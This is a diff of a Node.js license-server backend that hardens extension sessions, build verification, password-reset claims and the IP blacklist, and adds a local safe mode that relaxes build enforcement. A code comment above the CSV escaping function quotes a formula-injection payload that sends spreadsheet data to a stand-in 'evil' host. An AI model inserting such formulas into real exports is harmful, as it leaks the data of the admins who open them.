@@ -1,5 +1,16 @@
-const ZVM_BUILD_ID = '2026-09-11-security-hardening-r24';
+const ZVM_BUILD_ID = '2026-09-15-build-authority-r25';
 'use strict';
+
+function sanitizeStartupErrorMessage(error) {
+  let message = error && typeof error === 'object' && typeof error.message === 'string'
+    ? error.message
+    : (typeof error === 'string' ? error : 'STARTUP_FAILED');
+  message = String(message || 'STARTUP_FAILED').slice(0, 1200);
+  message = message.replace(/\b([a-z][a-z0-9+.-]*:\/\/)[^\s\/@]+(?::[^\s\/@]*)?@/gi, '$1<redacted>@');
+  message = message.replace(/\b(password|passwd|pwd|token|secret|api[_-]?key)=([^\s&;,]+)/gi, '$1=<redacted>');
+  return message || 'STARTUP_FAILED';
+}
+
 const http   = require('http');
 const https  = require('https');
 const crypto = require('crypto');
@@ -17,6 +28,14 @@ const {
   sendPasswordResetEmail, sendKeyDeliveryEmail, sendKeyExpiryWarningEmail, sendEmail,
   buildPasswordResetEmail, buildKeyDeliveryEmail, buildKeyExpiryWarningEmail,
 } = require('./mailer');
+const {
+  createBuildAuthority,
+  parseBuildMap: zvmSecurityBuildMap,
+  mergeBuildMaps: zvmSecurityMergeBuildMaps,
+  hashSet: zvmSecurityHashSet,
+  loadRegistryV2: zvmSecurityLoadRegistryV2,
+} = require('./security/build-authority');
+const { validateRuntimeSecurityConfig } = require('./security/runtime-config');
 
 const PORT         = process.env.PORT         || 3000;
 const ADMIN_USER   = process.env.ADMIN_USER;
@@ -44,6 +63,7 @@ const COMMERCIAL_TX_CLAIM_LEASE_MS = Math.max(30000, Math.min(5 * 60 * 1000, par
 const COMMERCIAL_TX_CLAIM_WAIT_MS = Math.max(0, Math.min(15000, parseInt(process.env.COMMERCIAL_TX_CLAIM_WAIT_MS || '5000', 10) || 5000));
 const COMMERCIAL_TX_CLAIM_RETENTION_DAYS = Math.max(30, Math.min(730, parseInt(process.env.COMMERCIAL_TX_CLAIM_RETENTION_DAYS || '400', 10) || 400));
 const IS_PRODUCTION = String(process.env.NODE_ENV || '').toLowerCase() === 'production' || String(process.env.RENDER || '').toLowerCase() === 'true';
+const ZVM_LOCAL_SAFE_MODE = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_LOCAL_SAFE_MODE || '').trim());
 const ANALYTICS_PASS = process.env.ANALYTICS_PASS || '';
 // Opcional: se preenchida, exige TOTP além da senha pra entrar no Analytics
 // (mesma implementação de verifyTOTP já usada pro admin — nenhuma lib nova).
@@ -273,7 +293,7 @@ setInterval(async () => {
   if (!_mongoDb) return;
   try { await _mongoDb.command({ ping: 1 }); }
   catch { _mongoDb = null; _mongoClient = null; console.warn('[DB] Conexão perdida — reconectando na próxima operação'); }
-}, 5 * 60 * 1000);
+}, 5 * 60 * 1000).unref();
 
 async function loadDb(opts = {}) {
   try {
@@ -285,7 +305,10 @@ async function loadDb(opts = {}) {
       console.error('[SEC] Falha ao garantir TTL de anti-replay compartilhado:', e.message);
     });
     try {
-      await db.collection('webhook_events').createIndex({ eventKey: 1 }, { unique: true, background: true });
+      if (ZVM_LOCAL_SAFE_MODE) {
+        _caktoIndexReady = false;
+      } else {
+        await db.collection('webhook_events').createIndex({ eventKey: 1 }, { unique: true, background: true });
       await db.collection('webhook_events').createIndex({ queueRef: 1 }, { unique: true, sparse: true, background: true });
       await db.collection('webhook_events').createIndex({ status: 1, nextAttemptAt: 1, createdAt: 1 }, { background: true });
       await db.collection('webhook_events').createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0, background: true });
@@ -302,6 +325,7 @@ async function loadDb(opts = {}) {
       await reconcileCaktoQueueCounter(db);
       if (CAKTO_WEBHOOK_SECRET) await assertCaktoQueueTransactionReady(db);
       _caktoIndexReady = true;
+      }
     } catch (e) {
       _caktoIndexReady = false;
       console.error('[CAKTO] Falha ao preparar autoridade durável:', safeScalar(e?.code || e?.message, 100, 'queue_prepare_failed'));
@@ -318,9 +342,10 @@ async function loadDb(opts = {}) {
     if (keyCount === 0) {
       console.warn(`[DB] Nenhuma chave em zapvoice.store (doc _id:"keys"). Verifique Atlas ou permissao do usuario.`);
     }
-    // Restaurar blacklist de IPs
+    // Restaurar blacklist de IPs em forma canônica para que IPv4-mapped/IPv6
+    // não criem entradas equivalentes com representações diferentes.
     if (Array.isArray(settingsDoc?.ipBlacklist)) {
-      for (const ip of settingsDoc.ipBlacklist) ipBlacklist.add(ip);
+      replaceIpBlacklist(settingsDoc.ipBlacklist);
       console.log(`[BOOT] IP blacklist: ${ipBlacklist.size} entrada(s)`);
     }
     // Restaurar blocos de rate limit ativos
@@ -957,6 +982,27 @@ function portalTotpDecrypt(box, email) {
   }
 }
 
+function preparePortalUserForEmailChange(user, oldEmail, newEmail) {
+  if (!user || typeof user !== 'object') throw Object.assign(new Error('portal_user_invalid'), { code: 'PORTAL_USER_INVALID' });
+  const sourceEmail = String(oldEmail || '').toLowerCase().trim();
+  const targetEmail = String(newEmail || '').toLowerCase().trim();
+  if (!sourceEmail || !targetEmail) throw Object.assign(new Error('portal_email_invalid'), { code: 'PORTAL_EMAIL_INVALID' });
+  const next = { ...user, _id: targetEmail, email: targetEmail };
+  delete next.emailChangeOp;
+  delete next.emailChangeTarget;
+  delete next.emailChangeStartedAt;
+  if (user.totpSecretEnc) {
+    const activeSecret = portalTotpDecrypt(user.totpSecretEnc, sourceEmail);
+    next.totpSecret = PORTAL_TOTP_ENCRYPTED_SENTINEL;
+    next.totpSecretEnc = portalTotpEncrypt(activeSecret, targetEmail);
+  }
+  if (user.pendingTotpSecretEnc) {
+    const pendingSecret = portalTotpDecrypt(user.pendingTotpSecretEnc, sourceEmail);
+    next.pendingTotpSecretEnc = portalTotpEncrypt(pendingSecret, targetEmail);
+  }
+  return next;
+}
+
 function portalTotpHasSecret(user) {
   return !!(user && (user.totpSecretEnc || user.totpSecret));
 }
@@ -1099,18 +1145,20 @@ function sendExtensionRateLimited(res, ip, type, body) {
   sendJson(res, { ...body, retryAfterSeconds: retryAfter || undefined }, 429);
 }
 
-setInterval(() => {
-  const now = Date.now();
-  for (const [k, e] of rateLimitMap.entries())
-    if (now > e.blockedUntil && now > e.resetAt) rateLimitMap.delete(k);
-  for (const [k, ts] of _dedupMap.entries())
-    if (now - ts > _DEDUP_TTL_MS) _dedupMap.delete(k);
-  // Limpar falhas de chave com mais de 1h
-  for (const [k, f] of keyFailMap.entries())
-    if (now - f.firstAt > 3600000) keyFailMap.delete(k);
-  // Persistir blocos ativos no MongoDB
-  persistRateBlocks().catch(() => {});
-}, 30 * 60 * 1000);
+if (!ZVM_LOCAL_SAFE_MODE) {
+  setInterval(() => {
+    const now = Date.now();
+    for (const [k, e] of rateLimitMap.entries())
+      if (now > e.blockedUntil && now > e.resetAt) rateLimitMap.delete(k);
+    for (const [k, ts] of _dedupMap.entries())
+      if (now - ts > _DEDUP_TTL_MS) _dedupMap.delete(k);
+    // Limpar falhas de chave com mais de 1h
+    for (const [k, f] of keyFailMap.entries())
+      if (now - f.firstAt > 3600000) keyFailMap.delete(k);
+    // Persistir blocos ativos no MongoDB
+    persistRateBlocks().catch(() => {});
+  }, 30 * 60 * 1000).unref();
+}
 
 setInterval(() => {
   const now = Date.now();
@@ -1120,53 +1168,55 @@ setInterval(() => {
     if (now > new Date(s.expiresAt).getTime()) delete portalSessions[k];
   for (const [k, s] of Object.entries(analyticsSessions))
     if (now > new Date(s.expiresAt).getTime()) delete analyticsSessions[k];
-}, 60 * 60 * 1000); // 1h — sessões duram horas, limpeza não precisa ser frequente
+}, 60 * 60 * 1000).unref(); // 1h — sessões duram horas, limpeza não precisa ser frequente
 
-// Cron: marca chaves expiradas + envia aviso de "expirando em breve" a cada hora
-setInterval(async () => {
-  const now = Date.now();
-  let expired = 0;
-  for (const [code, k] of Object.entries(keys)) {
-    // Marcar expiradas
-    if (k.active && k.expiresAt && new Date(k.expiresAt).getTime() < now) {
-      keys[code].active = false;
-      saveKey(code).catch(() => {});
-      fireWebhook('key_expired', code, 'Cron de expiração');
-      expired++;
-      continue;
-    }
-    // Aviso de expiração em breve (uma única vez por ciclo)
-    if (k.active && k.expiresAt && !k.warnEmailSent && RESEND_API_KEY) {
-      const msLeft = new Date(k.expiresAt).getTime() - now;
-      if (msLeft > 0 && msLeft <= EXPIRY_WARN_HOURS * 3600000) {
-        try {
-          const _db = await getMongoDb();
-          const _pu = await _db.collection('portal_users').findOne({ keyCode: code });
-          if (_pu && _pu._id) {
-            const hoursLeft = Math.ceil(msLeft / 3600000);
-            // warnEmailSent só é marcado com o retorno REAL do envio — antes era
-            // marcado incondicionalmente, então uma recusa do Resend (ou qualquer
-            // falha) perdia a tentativa pra sempre nesse ciclo de expiração (o
-            // cliente nunca mais recebia o aviso, mesmo com o provedor de volta
-            // no ar). Falhando, o próximo ciclo horário tenta de novo — sem risco
-            // de loop de spam, porque um sucesso interrompe as tentativas.
-            const warnSent = await sendKeyExpiryWarningEmail(_pu._id, {
-              code, hoursLeft, planLabel: planLabelForMaxUses(k.maxUses), maxUses: k.maxUses,
-              expiresAt: k.expiresAt, baseUrl: BASE_URL, ctaPath: '/cliente',
-            });
-            if (warnSent) {
-              keys[code].warnEmailSent = true;
-              saveKey(code).catch(() => {});
-            } else {
-              console.warn('[CRON] Aviso de expiração não confirmado pelo provedor — tenta de novo no próximo ciclo:', maskLicenseCode(code));
+if (!ZVM_LOCAL_SAFE_MODE) {
+  // Cron: marca chaves expiradas + envia aviso de "expirando em breve" a cada hora
+  setInterval(async () => {
+    const now = Date.now();
+    let expired = 0;
+    for (const [code, k] of Object.entries(keys)) {
+      // Marcar expiradas
+      if (k.active && k.expiresAt && new Date(k.expiresAt).getTime() < now) {
+        keys[code].active = false;
+        saveKey(code).catch(() => {});
+        fireWebhook('key_expired', code, 'Cron de expiração');
+        expired++;
+        continue;
+      }
+      // Aviso de expiração em breve (uma única vez por ciclo)
+      if (k.active && k.expiresAt && !k.warnEmailSent && RESEND_API_KEY) {
+        const msLeft = new Date(k.expiresAt).getTime() - now;
+        if (msLeft > 0 && msLeft <= EXPIRY_WARN_HOURS * 3600000) {
+          try {
+            const _db = await getMongoDb();
+            const _pu = await _db.collection('portal_users').findOne({ keyCode: code });
+            if (_pu && _pu._id) {
+              const hoursLeft = Math.ceil(msLeft / 3600000);
+              // warnEmailSent só é marcado com o retorno REAL do envio — antes era
+              // marcado incondicionalmente, então uma recusa do Resend (ou qualquer
+              // falha) perdia a tentativa pra sempre nesse ciclo de expiração (o
+              // cliente nunca mais recebia o aviso, mesmo com o provedor de volta
+              // no ar). Falhando, o próximo ciclo horário tenta de novo — sem risco
+              // de loop de spam, porque um sucesso interrompe as tentativas.
+              const warnSent = await sendKeyExpiryWarningEmail(_pu._id, {
+                code, hoursLeft, planLabel: planLabelForMaxUses(k.maxUses), maxUses: k.maxUses,
+                expiresAt: k.expiresAt, baseUrl: BASE_URL, ctaPath: '/cliente',
+              });
+              if (warnSent) {
+                keys[code].warnEmailSent = true;
+                saveKey(code).catch(() => {});
+              } else {
+                console.warn('[CRON] Aviso de expiração não confirmado pelo provedor — tenta de novo no próximo ciclo:', maskLicenseCode(code));
+              }
             }
-          }
-        } catch (e) { console.warn('[CRON] Aviso expiração:', e.message); }
+          } catch (e) { console.warn('[CRON] Aviso expiração:', e.message); }
+        }
       }
     }
-  }
-  if (expired > 0) { invalidateKeysHtmlCache(); console.log(`[CRON] ${expired} chave(s) expirada(s).`); }
-}, 60 * 60 * 1000);
+    if (expired > 0) { invalidateKeysHtmlCache(); console.log(`[CRON] ${expired} chave(s) expirada(s).`); }
+  }, 60 * 60 * 1000).unref();
+}
 
 function parseSafeWebhookUrl(raw) {
   try {
@@ -1693,6 +1743,21 @@ function extensionSessionSuccess(rawToken, sessionDoc, entitlement) {
   };
 }
 
+function extensionSessionSecurityFields(buildClient) {
+  const protocol = Number(buildClient?.securityProtocol) === 2 ? 2 : 1;
+  return {
+    securityProtocol: protocol,
+    buildId: protocol === 2 ? String(buildClient?.buildId || '').toLowerCase() || null : null,
+    channel: protocol === 2 ? String(buildClient?.channel || '').toLowerCase() || null : null,
+    profile: protocol === 2 ? String(buildClient?.profile || '').toLowerCase() || null : null,
+    extensionVersion: String(buildClient?.extensionVersion || '') || null,
+    extensionId: String(buildClient?.extensionId || '').toLowerCase() || null,
+    buildFingerprint: String(buildClient?.buildFingerprint || '').toLowerCase() || null,
+    installationId: protocol === 2 ? String(buildClient?.installationId || '') || null : null,
+    developmentAuthorized: buildClient?.developmentAuthorized === true,
+  };
+}
+
 async function createExtensionSession(descriptor, deps = {}) {
   const db = deps.db || await getMongoDb();
   const now = extensionNow(deps);
@@ -1710,6 +1775,19 @@ async function createExtensionSession(descriptor, deps = {}) {
       phoneNumber: normalizePhone(descriptor.phoneNumber || '') || null,
       deviceIdHash: descriptor.deviceId
         ? crypto.createHash('sha256').update(String(descriptor.deviceId), 'utf8').digest('hex')
+        : null,
+      securityProtocol: Number(descriptor.securityProtocol) === 2 ? 2 : 1,
+      buildId: Number(descriptor.securityProtocol) === 2 && /^zvm-(?:dev|beta|production)-\d+(?:\.\d+){2,3}-s[a-f0-9]{12}$/i.test(String(descriptor.buildId || ''))
+        ? String(descriptor.buildId).toLowerCase()
+        : null,
+      channel: Number(descriptor.securityProtocol) === 2 && ['dev','beta','production'].includes(String(descriptor.channel || '').toLowerCase())
+        ? String(descriptor.channel).toLowerCase()
+        : null,
+      profile: Number(descriptor.securityProtocol) === 2 && ['dev','release'].includes(String(descriptor.profile || '').toLowerCase())
+        ? String(descriptor.profile).toLowerCase()
+        : null,
+      installationIdHash: Number(descriptor.securityProtocol) === 2 && descriptor.installationId
+        ? crypto.createHash('sha256').update(String(descriptor.installationId), 'utf8').digest('hex')
         : null,
       extensionVersion: safeScalar(descriptor.extensionVersion, 24) || null,
       buildFingerprint: /^[a-f0-9]{64}$/i.test(String(descriptor.buildFingerprint || '')) ? String(descriptor.buildFingerprint).toLowerCase() : null,
@@ -1861,13 +1939,46 @@ async function refreshExtensionSession(rawToken, deps = {}) {
   const current = await readExtensionSession(rawToken, { ...deps, db, now });
   if (!current.ok) return extensionAuthFailure(current.errorCode, 401);
   const doc = current.doc;
-  if (zvmSecurityBuildDenied(doc.extensionVersion, doc.buildFingerprint)) {
-    await revokeExtensionSession(rawToken, { ...deps, db, now });
-    return extensionAuthFailure('BUILD_REVOKED', 403);
+  let buildDecision;
+  if (typeof deps.storedSessionDecision === 'function') {
+    buildDecision = deps.storedSessionDecision(doc);
+  } else if (typeof deps.buildDenied === 'function' && deps.buildDenied(doc.extensionVersion, doc.buildFingerprint, doc)) {
+    buildDecision = { ok:false, code:'BUILD_REVOKED' };
+  } else if (typeof deps.storedSessionAllowed === 'function') {
+    buildDecision = deps.storedSessionAllowed(doc) ? { ok:true } : { ok:false, code:'BUILD_NOT_ALLOWED' };
+  } else {
+    buildDecision = zvmSecurityStoredSessionDecision(doc);
   }
-  if (!zvmSecurityStoredSessionAllowed(doc)) {
+  if (!buildDecision.ok) {
     await revokeExtensionSession(rawToken, { ...deps, db, now });
-    return extensionAuthFailure('BUILD_NOT_ALLOWED', 403);
+    return extensionAuthFailure(buildDecision.code || 'BUILD_NOT_ALLOWED', zvmSecurityClientErrorStatus(buildDecision.code || 'BUILD_NOT_ALLOWED'));
+  }
+  if (Number(doc.securityProtocol || 1) === 2 && deps.requireCurrentClientSecurity === true && (!deps.clientSecurity || typeof deps.clientSecurity !== 'object')) {
+    await revokeExtensionSession(rawToken, { ...deps, db, now });
+    return extensionAuthFailure('SECURITY_CLIENT_REQUIRED', 400);
+  }
+  if (Number(doc.securityProtocol || 1) === 2 && deps.clientSecurity && typeof deps.clientSecurity === 'object') {
+    const checkCurrentClient = deps.checkClientShared || zvmSecurityCheckClientShared;
+    const currentSecurity = await checkCurrentClient(deps.clientSecurity, { licenseKey: doc.licenseKeyCode || '' });
+    if (!currentSecurity.ok) {
+      await revokeExtensionSession(rawToken, { ...deps, db, now });
+      return extensionAuthFailure(currentSecurity.code || 'BUILD_NOT_ALLOWED', zvmSecurityClientErrorStatus(currentSecurity.code || 'BUILD_NOT_ALLOWED'));
+    }
+    const installationIdHash = currentSecurity.installationId
+      ? crypto.createHash('sha256').update(String(currentSecurity.installationId), 'utf8').digest('hex')
+      : '';
+    const sameIdentity = Number(currentSecurity.securityProtocol) === 2 &&
+      String(currentSecurity.buildId || '').toLowerCase() === String(doc.buildId || '').toLowerCase() &&
+      String(currentSecurity.channel || '').toLowerCase() === String(doc.channel || '').toLowerCase() &&
+      String(currentSecurity.profile || '').toLowerCase() === String(doc.profile || '').toLowerCase() &&
+      String(currentSecurity.extensionVersion || '') === String(doc.extensionVersion || '') &&
+      String(currentSecurity.extensionId || '').toLowerCase() === String(doc.extensionId || '').toLowerCase() &&
+      String(currentSecurity.buildFingerprint || '').toLowerCase() === String(doc.buildFingerprint || '').toLowerCase() &&
+      installationIdHash === String(doc.installationIdHash || '').toLowerCase();
+    if (!sameIdentity) {
+      await revokeExtensionSession(rawToken, { ...deps, db, now });
+      return extensionAuthFailure('BUILD_NOT_ALLOWED', 403);
+    }
   }
   let entitlementResult;
   let licenseKeyCode = doc.licenseKeyCode || null;
@@ -1931,6 +2042,52 @@ async function resolveResetToken(db, rawToken) {
   }
   if (!rec || new Date() > new Date(rec.expiresAt)) return { rec: null, matchedId: null };
   return { rec, matchedId };
+}
+
+async function claimResetToken(db, rawToken, now = new Date()) {
+  const at = new Date(now);
+  const raw = String(rawToken || '');
+  const ids = [hashResetToken(raw), raw];
+  for (const matchedId of ids) {
+    const rec = await db.collection('password_resets').findOneAndUpdate(
+      { _id: matchedId, expiresAt: { $gt: at }, consumedAt: { $exists: false } },
+      { $set: { consumedAt: at } },
+      { returnDocument: 'before' }
+    );
+    if (rec) return { rec, matchedId };
+  }
+  return { rec: null, matchedId: null };
+}
+
+async function claimPortalEmailChange(db, email, { operationId, targetEmail, startedAt = new Date() } = {}) {
+  const source = String(email || '').toLowerCase().trim();
+  const target = String(targetEmail || '').toLowerCase().trim();
+  const op = String(operationId || '').trim();
+  if (!source || !target || !op) return false;
+  const result = await db.collection('portal_users').updateOne(
+    { _id: source, emailChangeOp: { $exists: false } },
+    { $set: { emailChangeOp: op, emailChangeTarget: target, emailChangeStartedAt: new Date(startedAt) } }
+  );
+  return result?.matchedCount === 1;
+}
+
+async function releasePortalEmailChange(db, email, operationId) {
+  const source = String(email || '').toLowerCase().trim();
+  const op = String(operationId || '').trim();
+  if (!source || !op) return false;
+  const result = await db.collection('portal_users').updateOne(
+    { _id: source, emailChangeOp: op },
+    { $unset: { emailChangeOp: '', emailChangeTarget: '', emailChangeStartedAt: '' } }
+  );
+  return result?.matchedCount === 1;
+}
+
+async function finalizePortalEmailChange(db, email, operationId) {
+  const source = String(email || '').toLowerCase().trim();
+  const op = String(operationId || '').trim();
+  if (!source || !op) return false;
+  const result = await db.collection('portal_users').deleteOne({ _id: source, emailChangeOp: op });
+  return result?.deletedCount === 1;
 }
 
 function isFreeAuthKey(key) {
@@ -2455,9 +2612,43 @@ function logActionBadgeClass(action) {
 
 function normalizeClientIp(value) {
   let raw = String(value || '').trim();
-  if (raw.startsWith('::ffff:')) raw = raw.slice(7);
   if (raw.startsWith('[') && raw.endsWith(']')) raw = raw.slice(1, -1);
-  return net.isIP(raw) ? raw : '';
+  const mapped = /^::ffff:(\d{1,3}(?:\.\d{1,3}){3})$/i.exec(raw);
+  if (mapped && net.isIP(mapped[1]) === 4) return mapped[1];
+  const family = net.isIP(raw);
+  if (family === 4) return raw;
+  if (family !== 6) return '';
+  try {
+    const host = new URL('http:' + `//[${raw}]/`).hostname;
+    return host.slice(1, -1).toLowerCase();
+  } catch (_) {
+    return raw.toLowerCase();
+  }
+}
+function replaceIpBlacklist(values) {
+  ipBlacklist.clear();
+  for (const raw of Array.isArray(values) ? values : []) {
+    const ip = normalizeClientIp(raw);
+    if (ip) ipBlacklist.add(ip);
+    if (ipBlacklist.size >= 5000) break;
+  }
+  return [...ipBlacklist];
+}
+function addIpBlacklistEntry(value) {
+  const ip = normalizeClientIp(value);
+  if (!ip) return '';
+  ipBlacklist.add(ip);
+  return ip;
+}
+function removeIpBlacklistEntry(value) {
+  const ip = normalizeClientIp(value);
+  if (!ip) return '';
+  ipBlacklist.delete(ip);
+  return ip;
+}
+function isIpBlacklisted(value) {
+  const ip = normalizeClientIp(value);
+  return !!ip && ipBlacklist.has(ip);
 }
 function getIp(req) {
   const socketIp = normalizeClientIp(req.socket?.remoteAddress) || 'N/A';
@@ -4294,6 +4485,7 @@ function triggerCaktoWorker() {
 }
 
 function startCaktoWorker() {
+  if (ZVM_LOCAL_SAFE_MODE) return;
   if (!CAKTO_WEBHOOK_SECRET || _caktoWorkerTimer) return;
   triggerCaktoWorker();
   _caktoWorkerTimer = setInterval(triggerCaktoWorker, CAKTO_WORKER_POLL_MS);
@@ -4503,8 +4695,10 @@ function escHtml(s) {
 // =HYPERLINK("http://evil/?"&A1,"clique") exfiltra a planilha quando o admin abre o
 // export (CSV injection / formula injection).
 function csvCell(v) {
-  let s = String(v == null ? '' : v);
-  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  let s = String(v == null ? '' : v)
+    .replace(/[\r\n]+/g, ' ')
+    .replace(/[\t\f\v]+/g, ' ');
+  if (/^[\u0000-\u0020]*[=+\-@]/.test(s)) s = "'" + s;
   return '"' + s.replace(/"/g, '""') + '"';
 }
 
@@ -10189,49 +10383,12 @@ async function runInternalSecurityAudit() {
 const ZVM_SERVER_AUTHORITY_PATCH_V1 = true;
 const ZVM_BUILD_AUTHORITY_FAILCLOSED_V2 = true;
 const ZVM_SECURITY_PROTOCOL = 1;
-const ZVM_BUILD_ENFORCE = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_BUILD_ENFORCE || '').trim());
-// Compatibilidade explícita para a ZapVoice/ZVM V3 durante coexistência.
-// Com enforcement desligado, V3 segue compatível como hoje. Ao ligar o enforcement
-// para a nova ZVM, V3 fecha por padrão e só permanece ativo com opt-in operacional.
-const ZVM_LEGACY_V3_ALLOW = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_LEGACY_V3_ALLOW || '').trim());
-function legacyV3Allowed() { return !ZVM_BUILD_ENFORCE || ZVM_LEGACY_V3_ALLOW; }
+const ZVM_BUILD_ENFORCE = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_BUILD_ENFORCE || '').trim());
+const ZVM_LEGACY_V3_ALLOW = ZVM_LOCAL_SAFE_MODE ? true : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_LEGACY_V3_ALLOW || '').trim());
 const ZVM_SECURITY_CLOCK_SKEW_MS = 15 * 60 * 1000;
 const ZVM_SECURITY_REQUEST_TTL_MS = 20 * 60 * 1000;
-const ZVM_SECURITY_SEEN = new Map();
 
-function zvmSecurityBuildMap(raw) {
-  const out = new Map();
-  const add = (version, fp) => {
-    version = String(version || '').trim(); fp = String(fp || '').trim().toLowerCase();
-    if (!/^\d+(?:\.\d+){2,3}$/.test(version) || !/^[a-f0-9]{64}$/.test(fp)) return;
-    if (!out.has(version)) out.set(version, new Set()); out.get(version).add(fp);
-  };
-  if (raw && typeof raw === 'object' && !Array.isArray(raw)) {
-    const source = raw.builds && typeof raw.builds === 'object' ? raw.builds : raw;
-    for (const [version, value] of Object.entries(source || {})) {
-      if (Array.isArray(value)) value.forEach(fp => add(version, fp)); else add(version, value);
-    }
-    return out;
-  }
-  raw = String(raw || '').trim();
-  if (!raw) return out;
-  if (raw.startsWith('{')) {
-    try { return zvmSecurityBuildMap(JSON.parse(raw)); } catch (_) {}
-  }
-  for (const item of raw.split(/[;,\n]+/)) {
-    const m = item.trim().match(/^(\d+(?:\.\d+){2,3})\s*[:@=]\s*([a-fA-F0-9]{64})$/);
-    if (m) add(m[1], m[2]);
-  }
-  return out;
-}
-function zvmSecurityMergeBuildMaps(target, source) {
-  for (const [version, set] of source || []) {
-    if (!target.has(version)) target.set(version, new Set());
-    for (const fp of set || []) target.get(version).add(fp);
-  }
-  return target;
-}
-function zvmSecurityLoadOfficialBuilds() {
+const ZVM_OFFICIAL_BUILDS = (() => {
   const out = new Map();
   const registryPath = path.join(__dirname, 'zvm-official-builds.json');
   try {
@@ -10240,71 +10397,26 @@ function zvmSecurityLoadOfficialBuilds() {
   } catch (error) {
     console.error('[SEC] Registro local de builds oficiais indisponível:', error.message);
   }
-  // Permite adicionar builds de emergência no Render sem remover o registro
-  // versionado que acompanha o servidor.
   zvmSecurityMergeBuildMaps(out, zvmSecurityBuildMap(process.env.ZVM_OFFICIAL_BUILDS || ''));
   return out;
-}
-const ZVM_OFFICIAL_BUILDS = zvmSecurityLoadOfficialBuilds();
+})();
 const ZVM_DENIED_BUILDS = zvmSecurityBuildMap(process.env.ZVM_DENIED_BUILDS || '');
-
-function zvmSecurityHash(value) { return crypto.createHash('sha256').update(String(value == null ? '' : value), 'utf8').digest('hex'); }
-function zvmSecurityHashSet(raw) {
-  const out = new Set();
-  String(raw || '').split(/[;,\n\s]+/).forEach(v => { v=String(v||'').trim().toLowerCase(); if (/^[a-f0-9]{64}$/.test(v)) out.add(v); });
-  return out;
+let ZVM_BUILD_REGISTRY_V2 = new Map();
+let ZVM_BUILD_REGISTRY_V2_ERROR = null;
+try {
+  ZVM_BUILD_REGISTRY_V2 = zvmSecurityLoadRegistryV2(
+    path.join(__dirname, 'zvm-build-registry-v2.json'),
+    process.env.ZVM_BUILD_REGISTRY_V2_EXTRA_JSON || ''
+  );
+} catch (error) {
+  ZVM_BUILD_REGISTRY_V2_ERROR = error;
 }
-const ZVM_DEV_BUILD_ALLOW = /^(1|true|yes|on)$/i.test(String(process.env.ZVM_DEV_BUILD_ALLOW || ''));
+const ZVM_RUNTIME_ENV = String(process.env.ZVM_RUNTIME_ENV || '').trim().toLowerCase();
+const ZVM_DEV_BUILD_ALLOW = ZVM_LOCAL_SAFE_MODE ? false : /^(1|true|yes|on)$/i.test(String(process.env.ZVM_DEV_BUILD_ALLOW || ''));
 const ZVM_DEV_BUILD_KEY_HASHES = zvmSecurityHashSet(process.env.ZVM_DEV_BUILD_KEY_HASHES || '');
 const ZVM_DEV_BUILD_DEVICE_HASHES = zvmSecurityHashSet(process.env.ZVM_DEV_BUILD_DEVICE_HASHES || '');
-function zvmSecurityDevBuildAllowed(keyCode, deviceId) {
-  if (!ZVM_DEV_BUILD_ALLOW || !keyCode || !deviceId || !ZVM_DEV_BUILD_KEY_HASHES.size || !ZVM_DEV_BUILD_DEVICE_HASHES.size) return false;
-  return ZVM_DEV_BUILD_KEY_HASHES.has(zvmSecurityHash(String(keyCode))) && ZVM_DEV_BUILD_DEVICE_HASHES.has(zvmSecurityHash(String(deviceId)));
-}
-function zvmSecurityBuildRecognized(version, fingerprint) { const set = ZVM_OFFICIAL_BUILDS.get(String(version || '')); return !!(set && set.has(String(fingerprint || '').toLowerCase())); }
-function zvmSecurityBuildDenied(version, fingerprint) { const set = ZVM_DENIED_BUILDS.get(String(version || '')); return !!(set && set.has(String(fingerprint || '').toLowerCase())); }
-function zvmSecurityStoredSessionAllowed(doc) {
-  if (!doc || typeof doc !== 'object' || Array.isArray(doc)) return false;
-  const extensionVersion = String(doc.extensionVersion || '').trim();
-  const buildFingerprint = String(doc.buildFingerprint || '').trim().toLowerCase();
-  const extensionId = String(doc.extensionId || '').trim().toLowerCase();
-  if (zvmSecurityBuildDenied(extensionVersion, buildFingerprint)) return false;
-  if (!ZVM_BUILD_ENFORCE) return true;
-  if (!/^\d+(?:\.\d+){2,3}$/.test(extensionVersion) || !/^[a-f0-9]{64}$/.test(buildFingerprint) || !/^[a-p]{32}$/.test(extensionId)) return false;
-  if (ZVM_EXTENSION_IDS.size && !ZVM_EXTENSION_IDS.has(extensionId)) return false;
-  if (zvmSecurityBuildRecognized(extensionVersion, buildFingerprint)) return true;
-  return doc.developmentAuthorized === true && ZVM_DEV_BUILD_ALLOW === true;
-}
-function zvmSecurityCleanupSeen(now) {
-  if (ZVM_SECURITY_SEEN.size < 1024) return;
-  for (const [id, ts] of ZVM_SECURITY_SEEN) if (now - ts > ZVM_SECURITY_REQUEST_TTL_MS) ZVM_SECURITY_SEEN.delete(id);
-  while (ZVM_SECURITY_SEEN.size > 4096) ZVM_SECURITY_SEEN.delete(ZVM_SECURITY_SEEN.keys().next().value);
-}
-function zvmSecurityCheckClient(raw, consume, options) {
-  options = options && typeof options === 'object' ? options : {};
-  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return { ok:false, code:'SECURITY_CLIENT_INVALID' };
-  const protocol = Number(raw.protocol || 0);
-  const extensionVersion = String(raw.extensionVersion || '').trim();
-  const extensionId = String(raw.extensionId || '').trim().toLowerCase();
-  const buildFingerprint = String(raw.buildFingerprint || '').trim().toLowerCase();
-  const requestId = String(raw.requestId || '').trim();
-  const sentAtMs = Number(raw.sentAtMs || 0), now = Date.now();
-  if (protocol !== ZVM_SECURITY_PROTOCOL || !/^\d+(?:\.\d+){2,3}$/.test(extensionVersion) || !/^[a-f0-9]{64}$/.test(buildFingerprint) || !/^[a-p]{32}$/.test(extensionId)) return { ok:false, code:'SECURITY_CLIENT_INVALID' };
-  if (zvmSecurityBuildDenied(extensionVersion, buildFingerprint)) return { ok:false, code:'BUILD_REVOKED', recognized:false, extensionVersion, extensionId, buildFingerprint };
-  if (ZVM_EXTENSION_IDS.size && !ZVM_EXTENSION_IDS.has(extensionId)) return { ok:false, code:'EXTENSION_ID_NOT_ALLOWED' };
